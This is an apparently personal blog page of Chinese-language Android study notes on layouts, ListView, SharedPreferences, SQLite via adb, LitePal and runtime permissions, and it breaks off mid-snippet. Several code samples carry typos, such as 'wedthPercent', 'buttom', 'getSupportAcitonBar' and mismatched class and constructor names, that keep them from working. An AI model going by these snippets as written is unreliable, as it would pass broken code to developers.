<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="RelativeLayout"><a href="#RelativeLayout" class="headerlink" title="RelativeLayout"></a>RelativeLayout</h4><ul>
<li><p>相对父元素布局</p>
<p>android:layout_alignParentButtom</p>
<p>android:layout_alignParentTop</p>
<p>android:layout_alignParentLeft</p>
<p>android:layout_alignParentRight</p>
<p>android:layout_centerInParent</p>
<p>取值均为布耳值</p>
</li>
<li><p>相对控件布局</p>
<p>android:layout_above=”@id/id值”</p>
<p>android:layout_below=”@id/id值”</p>
<p>android:layout_toRightOf=”@id/id值”</p>
<p>android:layout_toLeftOf=”@id/id值”</p>
<p>ps:当一个控件引用另一个控件ｉｄ时必须要定义在引用控件的后面。</p>
</li>
</ul>
<h4 id="FrameLayout"><a href="#FrameLayout" class="headerlink" title="FrameLayout"></a>FrameLayout</h4><h4 id="PercentFrameLayout"><a href="#PercentFrameLayout" class="headerlink" title="PercentFrameLayout"></a>PercentFrameLayout</h4><p>在app/build.gradle文件的dependencies</p>
<p>添加　<code>compile &#39;com.android.support:percent:24.2.1&#39;</code></p>
<p>sync now</p>
<p>例子：一屏占满四个按钮</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left | top&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button1&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;right | top&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button2&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button3&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left | bottom&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button3&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button4&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;right | buttom&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button4&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="自定义系统控件"><a href="#自定义系统控件" class="headerlink" title="自定义系统控件"></a>自定义系统控件</h3><ul>
<li>自定义布局顶栏ActionBar</li>
</ul>
<p>将写好的标题栏xml放入layout文件夹中，假设为title.xml</p>
<p>在activity_main.xml布局文件中添加</p>
<p><code>&lt;include layout = &quot;layout/title&quot;&gt;</code></p>
<p>把系统自带的标题栏隐藏</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// in func OnCreate()</span></span><br><span class="line">ActionBar Actionbar = getSupportAcitonBar();</span><br><span class="line"><span class="keyword">if</span>(actionbar != <span class="keyword">null</span>)</span><br><span class="line">    actionbar.hide();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>自定义控件</li>
</ul>
<p>在title.xml已经建立好的情况下，新建一个TitleLayout继承自LinearLayout,让他成为自定义的标签栏控件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleLinearout</span> <span class="keyword">extends</span> <span class="title">LinearLayout</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TitileLayout</span><span class="params">(Context context , AttributeSet attrs)</span></span></span><br><span class="line"><span class="function">        <span class="title">super</span><span class="params">(context,attrs)</span></span>;</span><br><span class="line">    <span class="comment">//动态加载一个布局文件，inflate接受两个参数，id和加载好的布局添加一个父布局</span></span><br><span class="line">    	LayoutInflater.from(context).inflate(R.layout.title,<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在布局文件中添加自定义控件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayuot</span>&gt;</span></span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout+_height=&quot;warp_content&quot;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure>

<p>在事件触发的时候直接调用就行</p>
<h3 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h3><p>activity_main.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>//MainAcitivity.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] data = &#123;</span><br><span class="line">            <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(</span><br><span class="line">                MainActivity.<span class="keyword">this</span>, android.R.layout.simple_list_item_1,data</span><br><span class="line">        );</span><br><span class="line">        ListView listview = (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listview.setAdapter(adapter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>//  listview点击事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] data = &#123;</span><br><span class="line">           <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span>,</span><br><span class="line">           <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">       ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(</span><br><span class="line">               MainActivity.<span class="keyword">this</span>, android.R.layout.simple_list_item_1,data</span><br><span class="line">       );</span><br><span class="line">       ListView listview = (ListView) findViewById(R.id.list_view);</span><br><span class="line">       listview.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line">       listview.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">               Toast.makeText(MainActivity.<span class="keyword">this</span>, position+<span class="string">&quot; is clicked &quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>进阶：<ol>
<li>结合图片的listerview</li>
<li>提升效率</li>
</ol>
</li>
</ul>
<h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h3><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="context类使用java文件流读写文件"><a href="#context类使用java文件流读写文件" class="headerlink" title="context类使用java文件流读写文件"></a>context类使用java文件流读写文件</h3><p>懒的看，用到时再写，不如用sharePreferences</p>
<h3 id="SharePreferences-通过键值对存储数据"><a href="#SharePreferences-通过键值对存储数据" class="headerlink" title="SharePreferences(通过键值对存储数据)"></a>SharePreferences(通过键值对存储数据)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//事先定义两个按钮，一个存储数据按钮一个恢复数据按钮</span></span><br><span class="line"><span class="comment">//存储数据</span></span><br><span class="line">Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">                editor.putInt(<span class="string">&quot;age&quot;</span>,<span class="number">23</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复数据</span></span><br><span class="line">        Button button1 = (Button)findViewById(R.id.restore_button);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String TAG = <span class="string">&quot;mylog&quot;</span>;</span><br><span class="line">                SharedPreferences pref = getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class="line">                String name = pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> age = pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">boolean</span> married = pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;name is &quot;</span>+name);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;age is &quot;</span>+age);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;married is&quot;</span> +married);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>adb操作</p>
<ul>
<li>adb shell进入调试</li>
<li>su提权获得root权限</li>
<li>cd到程序文件目录，一般为<code>/data/data/包名/</code></li>
</ul>
<p>sqlite操作</p>
<ol>
<li><code>sqlite3 databse.db</code> 进入名为database.db的数据库</li>
<li>.<code>table</code>　列出表　　 <code>.schema</code>　列出所有表结构　　 <code>.exit</code>　　退出sqlite交互式命令</li>
<li>查询　　　<code>select * from table_name</code></li>
</ol>
<h3 id="litepal操作sqlite数据库"><a href="#litepal操作sqlite数据库" class="headerlink" title="litepal操作sqlite数据库"></a>litepal操作sqlite数据库</h3><ul>
<li><p>配置</p>
<h4 id="1-Include-library"><a href="#1-Include-library" class="headerlink" title="1. Include library"></a>1. Include library</h4><p>Edit your <strong>build.gradle</strong> file and add below dependency.</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.litepal.guolindev:core:3.2.2&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-Configure-litepal-xml"><a href="#2-Configure-litepal-xml" class="headerlink" title="2. Configure litepal.xml"></a>2. Configure litepal.xml</h4><p>Create a file in the <strong>assets</strong> folder of your project and name it as <strong>litepal.xml</strong>. Then copy the following codes into it.</p>
<p>再项目文件夹下右键新建一个asset folder - 然后添加一个文件命名为litepal.xml，复制粘贴以下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define the database name of your application. </span></span><br><span class="line"><span class="comment">    	By default each database name should be end with .db. </span></span><br><span class="line"><span class="comment">    	If you didn&#x27;t name your database end with .db, </span></span><br><span class="line"><span class="comment">    	LitePal would plus the suffix automatically for you.</span></span><br><span class="line"><span class="comment">    	For example:    </span></span><br><span class="line"><span class="comment">    	&lt;dbname value=&quot;demo&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;demo&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define the version of your database. Each time you want </span></span><br><span class="line"><span class="comment">    	to upgrade your database, the version tag would helps.</span></span><br><span class="line"><span class="comment">    	Modify the models you defined in the mapping tag, and just </span></span><br><span class="line"><span class="comment">    	make the version value plus one, the upgrade of database</span></span><br><span class="line"><span class="comment">    	will be processed automatically without concern.</span></span><br><span class="line"><span class="comment">			For example:    </span></span><br><span class="line"><span class="comment">    	&lt;version value=&quot;1&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define your models in the list with mapping tag, LitePal will</span></span><br><span class="line"><span class="comment">    	create tables for each mapping class. The supported fields</span></span><br><span class="line"><span class="comment">    	defined in models will be mapped into columns.</span></span><br><span class="line"><span class="comment">    	For example:    </span></span><br><span class="line"><span class="comment">    	&lt;list&gt;</span></span><br><span class="line"><span class="comment">    		&lt;mapping class=&quot;com.test.model.Reader&quot; /&gt;</span></span><br><span class="line"><span class="comment">    		&lt;mapping class=&quot;com.test.model.Magazine&quot; /&gt;</span></span><br><span class="line"><span class="comment">    	&lt;/list&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">&quot;包名.类名&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        Define where the .db file should be. &quot;internal&quot; means the .db file</span></span><br><span class="line"><span class="comment">        will be stored in the database folder of internal storage which no</span></span><br><span class="line"><span class="comment">        one can access. &quot;external&quot; means the .db file will be stored in the</span></span><br><span class="line"><span class="comment">        path to the directory on the primary external storage device where</span></span><br><span class="line"><span class="comment">        the application can place persistent files it owns which everyone</span></span><br><span class="line"><span class="comment">        can access. &quot;internal&quot; will act as default.</span></span><br><span class="line"><span class="comment">        For example:</span></span><br><span class="line"><span class="comment">        &lt;storage value=&quot;external&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>This is the only configuration file, and the properties are simple.</p>
<ul>
<li><strong>dbname</strong> configure the database name of project.</li>
<li><strong>version</strong> configure the version of database. Each time you want to upgrade database, plus the value here.</li>
<li><strong>list</strong> configure the mapping classes.</li>
<li><strong>storage</strong> configure where the database file should be stored. <strong>internal</strong> and <strong>external</strong> are the only valid options.</li>
</ul>
<h4 id="3-Configure-LitePalApplication"><a href="#3-Configure-LitePalApplication" class="headerlink" title="3. Configure LitePalApplication"></a>3. Configure LitePalApplication</h4><p>You don’t want to pass the Context param all the time. To makes the APIs simple, just configure the LitePalApplication in <strong>AndroidManifest.xml</strong> as below:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Of course you may have your own Application and has already configured here, like:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.example.MyOwnApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>That’s OK. LitePal can still live with that. Just call <strong>LitePal.initialize(context)</strong> in your own Application:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyOwnApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        LitePal.initialize(<span class="keyword">this</span>);<span class="comment">//直接使用这个也行，或者按照上面步骤去注册全局配置</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Make sure to call this method as early as you can. In the <strong>onCreate()</strong> method of Application will be fine. And always remember to use the application context as parameter. Do not use any instance of activity or service as parameter, or memory leaks might happen.</p>
</li>
<li><p>使用</p>
<p>创建一个类,名字就为mapping中的类名，</p>
<p>假设有一个类book,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">LitePalSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pages;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String press;</span><br><span class="line">    <span class="comment">//省略所有属性的set &amp; get</span></span><br></pre></td></tr></table></figure>



<p>然后再MainActivity中<code>Connector.getDatabase();</code>即完成了对数据库的创建，结构就是Book中定义的</p>
<ul>
<li><p>增</p>
<p><strong>对于增加数据的类比如Book需要继承　<code>extends LitePalSupport</code>　才可以增加记录.</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line"> Book book =<span class="keyword">new</span> Book();</span><br><span class="line">                book.setName(<span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                book.setAuthor(<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                book.setPages(<span class="number">454</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Unknow&quot;</span>);</span><br><span class="line">                book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">                book.save();</span><br></pre></td></tr></table></figure></li>
<li><p>更新</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">                Book book = <span class="keyword">new</span> Book();</span><br><span class="line">                book.setPrice(<span class="number">14.59</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">                book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>,<span class="string">&quot;The Da Vinci Code&quot;</span>,<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line"><span class="comment">//更新表中书名为The Da Vinci Code　且作者为Dan Brown的书出版社，价格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//更新所有书的页数初始值</span></span><br><span class="line">Book book = <span class="keyword">new</span> Book();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure></li>
<li><p>删除</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除价格低于１５的记录</span></span><br><span class="line">LitePal.deleteAll(Book.class,<span class="string">&quot;price &lt; ?&quot;</span>,<span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Book&gt; books = LitePal.findAll(Book.class);</span><br><span class="line"><span class="keyword">for</span>(Book book:books)</span><br><span class="line">&#123;</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span>+book.getName());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span>+book.getAuthor());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span>+book.getPages());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span>+book.getPrice());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book press is &quot;</span>+book.getPress());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>更多</p>
<ul>
<li><a href="http://blog.csdn.net/guolin_blog/category_9262963.html">http://blog.csdn.net/guolin_blog/category_9262963.html</a></li>
<li><a href="https://github.com/guolindev/LitePal">https://github.com/guolindev/LitePal</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Context-Provider"><a href="#Context-Provider" class="headerlink" title="Context Provider"></a>Context Provider</h2><p>  主要用于在不同的应用程序之间的数据共享功能，它提供一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访问程序的安全性。</p>
<p>运行时权限</p>
<ul>
<li>安卓６开始对使用的运行时权限，在程序运行时对权限提出申请</li>
</ul>
<h3 id="例子拨打电话"><a href="#例子拨打电话" class="headerlink" title="例子拨打电话"></a>例子拨打电话</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Manifest.xml中添加权限申请--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CALL_PHONE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button makeCall = (Button) findViewById(R.id.make_call);</span><br><span class="line">        makeCall.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//查看是否有拨打电话的权限，如果有，调用call()进行拨打；否则申请权限</span></span><br><span class="line">                <span 